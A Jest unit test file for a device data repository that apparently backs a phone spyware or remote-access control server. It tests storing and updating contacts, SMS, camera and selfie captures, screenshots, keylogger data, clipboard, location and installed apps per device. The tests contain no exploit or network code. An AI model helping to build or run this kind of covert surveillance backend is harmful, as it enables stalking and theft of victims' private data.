/**
 * Unit tests for DeviceDataRepository
 */

const DeviceDataRepository = require('../../../repositories/deviceDataRepository');
const { createTestDeviceData } = require('../../helpers/mockFactories');

describe('DeviceDataRepository', () => {
  let deviceDataRepository;

  beforeEach(async () => {
    deviceDataRepository = new DeviceDataRepository();
    await deviceDataRepository.init();
    // Bắt buộc rẽ sang in-memory để tránh lỗi UUID khi Postgres khả dụng
    deviceDataRepository.useDatabase = false;
    deviceDataRepository.deviceData = new Map();
  });

  describe('init', () => {
    it('should initialize with in-memory storage when database not available', async () => {
      expect(deviceDataRepository.useDatabase).toBe(false);
      expect(deviceDataRepository.deviceData).toBeDefined();
    });
  });

  describe('getDefaultData', () => {
    it('should return default device data structure', () => {
      const deviceId = 'test-device';
      const defaultData = deviceDataRepository.getDefaultData(deviceId);
      
      expect(defaultData.deviceId).toBe(deviceId);
      expect(defaultData.contacts).toEqual([]);
      expect(defaultData.sms).toEqual([]);
      expect(defaultData.calls).toEqual([]);
      expect(defaultData.gallery).toEqual([]);
      expect(defaultData.camera).toBeDefined();
      expect(defaultData.camera.main).toEqual([]);
      expect(defaultData.camera.selfie).toEqual([]);
      expect(defaultData.screenshots).toEqual([]);
      expect(defaultData.keylogger).toBeDefined();
      expect(defaultData.keylogger.enabled).toBe(false);
      expect(defaultData.clipboard).toBe('');
      expect(defaultData.location).toBeNull();
      expect(defaultData.apps).toEqual([]);
      expect(defaultData.files).toEqual([]);
    });
  });

  describe('findByDeviceId', () => {
    it('should return null when device data not found', async () => {
      const result = await deviceDataRepository.findByDeviceId('non-existent');
      expect(result).toBeNull();
    });

    it('should return device data when found', async () => {
      const deviceId = 'test-device';
      const deviceData = createTestDeviceData({
        contacts: [{ name: 'John', phone: '1234567890' }],
      });
      
      await deviceDataRepository.create({ ...deviceData, deviceId });
      
      const result = await deviceDataRepository.findByDeviceId(deviceId);
      expect(result).toBeDefined();
      expect(result.deviceId).toBe(deviceId);
      expect(result.contacts).toHaveLength(1);
    });
  });

  describe('create', () => {
    it('should create device data', async () => {
      const deviceId = 'test-device';
      const deviceData = createTestDeviceData();
      
      const result = await deviceDataRepository.create({ ...deviceData, deviceId });
      
      expect(result.deviceId).toBe(deviceId);
      expect(result.contacts).toEqual([]);
    });

    it('should create device data with initial values', async () => {
      const deviceId = 'test-device';
      const deviceData = createTestDeviceData({
        contacts: [{ name: 'Jane', phone: '0987654321' }],
        sms: [{ address: '123', body: 'Hello' }],
      });
      
      const result = await deviceDataRepository.create({ ...deviceData, deviceId });
      
      expect(result.contacts).toHaveLength(1);
      expect(result.sms).toHaveLength(1);
    });
  });

  describe('updateByType', () => {
    it('should update contacts', async () => {
      const deviceId = 'test-device';
      await deviceDataRepository.create({ deviceId, ...deviceDataRepository.getDefaultData(deviceId) });
      
      const contacts = [{ name: 'John', phone: '1234567890' }];
      await deviceDataRepository.updateByType(deviceId, 'contacts', contacts);
      
      const data = await deviceDataRepository.findByDeviceId(deviceId);
      expect(data.contacts).toEqual(contacts);
    });

    it('should update SMS', async () => {
      const deviceId = 'test-device';
      await deviceDataRepository.create({ deviceId, ...deviceDataRepository.getDefaultData(deviceId) });
      
      const sms = [{ address: '123', body: 'Hello', date: new Date().toISOString() }];
      await deviceDataRepository.updateByType(deviceId, 'sms', sms);
      
      const data = await deviceDataRepository.findByDeviceId(deviceId);
      expect(data.sms).toEqual(sms);
    });

    it('should append to main camera', async () => {
      const deviceId = 'test-device';
      await deviceDataRepository.create({ deviceId, ...deviceDataRepository.getDefaultData(deviceId) });
      
      const image1 = 'base64image1';
      const image2 = 'base64image2';
      
      await deviceDataRepository.updateByType(deviceId, 'main-camera', image1);
      await deviceDataRepository.updateByType(deviceId, 'main-camera', image2);
      
      const data = await deviceDataRepository.findByDeviceId(deviceId);
      expect(data.camera.main).toHaveLength(2);
      expect(data.camera.main[0].image).toBe(image1);
      expect(data.camera.main[1].image).toBe(image2);
    });

    it('should append to selfie camera', async () => {
      const deviceId = 'test-device';
      await deviceDataRepository.create({ deviceId, ...deviceDataRepository.getDefaultData(deviceId) });
      
      const image = 'base64selfie';
      await deviceDataRepository.updateByType(deviceId, 'selfie-camera', image);
      
      const data = await deviceDataRepository.findByDeviceId(deviceId);
      expect(data.camera.selfie).toHaveLength(1);
      expect(data.camera.selfie[0].image).toBe(image);
    });

    it('should append to screenshots', async () => {
      const deviceId = 'test-device';
      await deviceDataRepository.create({ deviceId, ...deviceDataRepository.getDefaultData(deviceId) });
      
      const screenshot1 = 'base64screenshot1';
      const screenshot2 = 'base64screenshot2';
      
      await deviceDataRepository.updateByType(deviceId, 'screenshot', screenshot1);
      await deviceDataRepository.updateByType(deviceId, 'screenshot', screenshot2);
      
      const data = await deviceDataRepository.findByDeviceId(deviceId);
      expect(data.screenshots).toHaveLength(2);
    });

    it('should update keylogger status', async () => {
      const deviceId = 'test-device';
      await deviceDataRepository.create({ deviceId, ...deviceDataRepository.getDefaultData(deviceId) });
      
      await deviceDataRepository.updateByType(deviceId, 'keylogger-status', { enabled: true });
      
      const data = await deviceDataRepository.findByDeviceId(deviceId);
      expect(data.keylogger.enabled).toBe(true);
      
      await deviceDataRepository.updateByType(deviceId, 'keylogger-status', { enabled: false });
      const updatedData = await deviceDataRepository.findByDeviceId(deviceId);
      expect(updatedData.keylogger.enabled).toBe(false);
    });

    it('should append to keylogger data', async () => {
      const deviceId = 'test-device';
      await deviceDataRepository.create({ deviceId, ...deviceDataRepository.getDefaultData(deviceId) });
      
      await deviceDataRepository.updateByType(deviceId, 'keylogger', 'test');
      await deviceDataRepository.updateByType(deviceId, 'keylogger', 'data');
      
      const data = await deviceDataRepository.findByDeviceId(deviceId);
      expect(data.keylogger.data).toHaveLength(2);
    });

    it('should update clipboard', async () => {
      const deviceId = 'test-device';
      await deviceDataRepository.create({ deviceId, ...deviceDataRepository.getDefaultData(deviceId) });
      
      await deviceDataRepository.updateByType(deviceId, 'clipboard', 'Copied text');
      
      const data = await deviceDataRepository.findByDeviceId(deviceId);
      expect(data.clipboard).toBe('Copied text');
    });

    it('should update location', async () => {
      const deviceId = 'test-device';
      await deviceDataRepository.create({ deviceId, ...deviceDataRepository.getDefaultData(deviceId) });
      
      const location = { latitude: 10.123, longitude: 20.456 };
      await deviceDataRepository.updateByType(deviceId, 'location', location);
      
      const data = await deviceDataRepository.findByDeviceId(deviceId);
      expect(data.location).toEqual(location);
    });

    it('should update apps', async () => {
      const deviceId = 'test-device';
      await deviceDataRepository.create({ deviceId, ...deviceDataRepository.getDefaultData(deviceId) });
      
      const apps = [{ packageName: 'com.test.app', name: 'Test App' }];
      await deviceDataRepository.updateByType(deviceId, 'apps', apps);
      
      const data = await deviceDataRepository.findByDeviceId(deviceId);
      expect(data.apps).toEqual(apps);
    });
  });

  describe('updateFromResponse', () => {
    it('should update contacts from response', async () => {
      const deviceId = 'test-device';
      await deviceDataRepository.create({ deviceId, ...deviceDataRepository.getDefaultData(deviceId) });
      
      const response = { contacts: [{ name: 'John', phone: '123' }] };
      await deviceDataRepository.updateFromResponse(deviceId, 'contacts', response);
      
      const data = await deviceDataRepository.findByDeviceId(deviceId);
      expect(data.contacts).toEqual(response.contacts);
    });

    it('should update SMS from response', async () => {
      const deviceId = 'test-device';
      await deviceDataRepository.create({ deviceId, ...deviceDataRepository.getDefaultData(deviceId) });
      
      const response = { sms: [{ address: '123', body: 'Hello' }] };
      await deviceDataRepository.updateFromResponse(deviceId, 'sms', response);
      
      const data = await deviceDataRepository.findByDeviceId(deviceId);
      expect(data.sms).toEqual(response.sms);
    });

    it('should update location from response', async () => {
      const deviceId = 'test-device';
      await deviceDataRepository.create({ deviceId, ...deviceDataRepository.getDefaultData(deviceId) });
      
      const response = { location: { latitude: 10, longitude: 20 } };
      await deviceDataRepository.updateFromResponse(deviceId, 'location', response);
      
      const data = await deviceDataRepository.findByDeviceId(deviceId);
      expect(data.location).toEqual(response.location);
    });
  });

  describe('addFile', () => {
    it('should add file to device data', async () => {
      const deviceId = 'test-device';
      await deviceDataRepository.create({ deviceId, ...deviceDataRepository.getDefaultData(deviceId) });
      
      const fileData = {
        name: 'test.jpg',
        path: '/uploads/test.jpg',
        size: 1024,
      };
      
      await deviceDataRepository.addFile(deviceId, fileData);
      
      const data = await deviceDataRepository.findByDeviceId(deviceId);
      expect(data.files).toHaveLength(1);
      expect(data.files[0].name).toBe(fileData.name);
      expect(data.files[0].path).toBe(fileData.path);
    });

    it('should append multiple files', async () => {
      const deviceId = 'test-device';
      await deviceDataRepository.create({ deviceId, ...deviceDataRepository.getDefaultData(deviceId) });
      
      await deviceDataRepository.addFile(deviceId, { name: 'file1.jpg', path: '/file1.jpg', size: 100 });
      await deviceDataRepository.addFile(deviceId, { name: 'file2.jpg', path: '/file2.jpg', size: 200 });
      
      const data = await deviceDataRepository.findByDeviceId(deviceId);
      expect(data.files).toHaveLength(2);
    });
  });

  describe('delete', () => {
    it('should return false when device data not found', async () => {
      const result = await deviceDataRepository.delete('non-existent');
      expect(result).toBe(false);
    });

    it('should delete device data successfully', async () => {
      const deviceId = 'test-device';
      await deviceDataRepository.create({ deviceId, ...deviceDataRepository.getDefaultData(deviceId) });
      
      const result = await deviceDataRepository.delete(deviceId);
      expect(result).toBe(true);
      
      const found = await deviceDataRepository.findByDeviceId(deviceId);
      expect(found).toBeNull();
    });
  });
});

